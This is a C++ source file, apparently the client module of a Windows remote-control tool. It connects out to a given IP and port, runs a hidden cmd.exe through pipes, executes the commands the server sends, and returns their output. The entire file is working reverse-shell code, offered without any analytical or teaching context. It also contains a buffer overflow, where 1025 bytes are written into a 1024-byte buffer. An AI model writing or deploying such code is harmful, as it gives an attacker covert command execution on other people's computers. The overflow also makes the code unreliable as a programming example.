#include "stdafx.h"
#include "ShellCommand.h"


CShellCommand::CShellCommand(char* szIP, int nPort)
{
    m_szIp = szIP;
    m_nPort = nPort;
    m_ClientSocket.SetComand(this);
    //初始化句柄
    m_hCMDReadPipe = INVALID_HANDLE_VALUE;
    m_hCMDWritePipe = INVALID_HANDLE_VALUE;
    m_hMyReadPipe = INVALID_HANDLE_VALUE;
    m_hMyWritePipe = INVALID_HANDLE_VALUE;
    m_ReadPieThread = INVALID_HANDLE_VALUE;
    m_hEvent = ::CreateEvent(NULL, true, false, NULL);
    m_dwLastTime = 0;
    m_HeratThread = INVALID_HANDLE_VALUE;
}

CShellCommand::~CShellCommand()
{
    OutputDebugStringA("Log:~CShellCommand");
    CloseHandle(m_ProcessHandl);
    CloseHandle(m_hEvent);  
    if (m_HeratThread != INVALID_HANDLE_VALUE)
    {
        CloseHandle(m_HeratThread);
        m_HeratThread = INVALID_HANDLE_VALUE;
    }

    if (m_hCMDReadPipe != NULL)
        DisconnectNamedPipe(m_hCMDReadPipe);
    if (m_hCMDWritePipe != NULL)
        DisconnectNamedPipe(m_hCMDWritePipe);
    if (m_hMyReadPipe != NULL)
        DisconnectNamedPipe(m_hMyReadPipe);
    if (m_hMyWritePipe != NULL)
        DisconnectNamedPipe(m_hMyWritePipe);

    CloseHandle(m_hCMDReadPipe);
    CloseHandle(m_hCMDWritePipe);
    CloseHandle(m_hMyReadPipe);
    CloseHandle(m_hMyWritePipe);
}

void CShellCommand::OnRecv(char*  pBuffer, int nSize)
{
    switch (pBuffer[0])
    {
    case COMMAND_CMD_BEGIN:
    {
        Sleep(500);
        SetEvent(m_hEvent);
        OutputDebugStringA("Log:m_hEvent等到");
        break;
    }
    case COMMAND_HEARTBEAT:
    {
        Dbgprintf("收到心跳");
        m_dwLastTime = GetTickCount() / 1000;
        break;
    }
    case COMMAND_CMD_DATA:
        ExecuteCommand(pBuffer + 1);
        break;
    default:
        break;
    }
}

void CShellCommand::OnSend(char* pBuffer, int nSize)
{
    m_ClientSocket.OnSend(pBuffer, nSize);
}


unsigned __stdcall CShellCommand::HeratProc(LPVOID lpParam)
{
    CShellCommand* pThis = (CShellCommand*)lpParam;
    char Type = COMMAND_HEARTBEAT;
    DWORD LastTime = 0;
    while (true)
    {
        DWORD CurrTime = GetTickCount() / 1000;
        //先检测本地超时没
        DWORD chazhi = CurrTime - pThis->m_dwLastTime;
        if (chazhi > timeout)
        {
            //超时就退出
            Dbgprintf("心跳超时%d", chazhi);
            return false;
        }
        //间隔10秒发送一次心跳
        if (CurrTime - LastTime > 10)
        {
            OutputDebugStringA("Log:发送心跳");
            pThis->OnSend(&Type, sizeof(char));
            LastTime = GetTickCount() / 1000;
        }
    }
    return true;
}


void CShellCommand::Execute()
{
    bool bRet = m_ClientSocket.ConnectServer(m_szIp, m_nPort);
    if (!bRet)
    {
        return;
    }
    //连接成功就记录心跳
    m_dwLastTime = GetTickCount() / 1000;
    char Type = COMMAND_CMD_OPEN;
    OnSend(&Type, sizeof(char));
    WaitForSingleObject(m_hEvent, INFINITE);
    //初始化管道操作 
    bRet = InitPie();
    if (!bRet)
    {
        return;
    }
    //心跳包线程
    //m_HeratThread = (HANDLE)_beginthreadex(NULL, 0, HeratProc, this, 0, NULL);
    //if (m_HeratThread == INVALID_HANDLE_VALUE)
    //{
    //    return;
    //}
    m_ReadPieThread = (HANDLE)_beginthreadex(NULL, 0, ReadPieProc, this, 0, NULL);
    if (m_ReadPieThread != INVALID_HANDLE_VALUE)
    {
        //等待线程退出
        WaitForSingleObject(m_ReadPieThread, INFINITE);
        OutputDebugStringA("Log:强制结束读管道线程成功");
        CloseHandle(m_ReadPieThread);
        m_ReadPieThread = INVALID_HANDLE_VALUE;
    }
}

bool CShellCommand::ExecuteCommand(char* pBuffer)
{
    DWORD dwReadBytes = 0;
    OutputDebugStringA(pBuffer);
    //将数据写入管道
    return WriteFile(m_hMyWritePipe, pBuffer, strlen(pBuffer), &dwReadBytes, NULL);
}

void CShellCommand::OnClose()
{
    OutputDebugStringA("Log:强制结束读管道线程");
    TerminateThread(m_ReadPieThread,0);
    OutputDebugStringA("Log:强制结束CMD进程");
    TerminateProcess(m_ProcessHandl, 0);
}

bool CShellCommand::InitPie()
{
    //创建管道
    SECURITY_ATTRIBUTES sa = { 0 };
    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
    sa.bInheritHandle = TRUE;
    sa.lpSecurityDescriptor = NULL;
    BOOL bRet = false;
    bRet = CreatePipe(&m_hCMDReadPipe, &m_hMyWritePipe, &sa, 0);
    if (!bRet)
    {
        return false;
    }
    bRet = CreatePipe(&m_hMyReadPipe, &m_hCMDWritePipe, &sa, 0);
    if (!bRet)
    {
        return false;
    }

    STARTUPINFO si = { 0 };
    si.cb = sizeof(STARTUPINFO);
    si.dwFlags |= STARTF_USESTDHANDLES;
    si.hStdInput = m_hCMDReadPipe;
    si.hStdOutput = m_hCMDWritePipe;
    si.hStdError = m_hCMDWritePipe;
    TCHAR cCmdLine[] = { _T("cmd.exe") };
    bRet = CreateProcess(NULL,
        cCmdLine,
        NULL,//子进程句柄继承
        NULL,//子线程句柄继承
        TRUE,//是否继承开关
        CREATE_NO_WINDOW,//不显示窗口
        NULL,
        NULL,
        &si,
        &pi);
    if (!bRet)
    {
        return false;
    }
    //保存CMD进程句柄
    m_ProcessHandl = pi.hProcess;
    return true;
}

unsigned CShellCommand::ReadPieProc(LPVOID lpParam)
{
    CShellCommand* pdlg = (CShellCommand*)lpParam;
    DWORD dwReadBytes = 0;
    BOOL bRet = FALSE;
    char szBuf[1024];
    while (true)
    {
        memset(szBuf, 0, 1025);
        szBuf[0] = COMMAND_CMD_DATA;
        BOOL bRet = ReadFile(pdlg->m_hMyReadPipe, szBuf+1, 1024, &dwReadBytes, NULL);
        if (!bRet)
        {
            return 0;
        }
        if (dwReadBytes)
        {
            //发送给服务端
            pdlg->OnSend(szBuf, 1025);
            OutputDebugStringA("Log:CMD数据发送成功");
        }
    }
    return 1;
}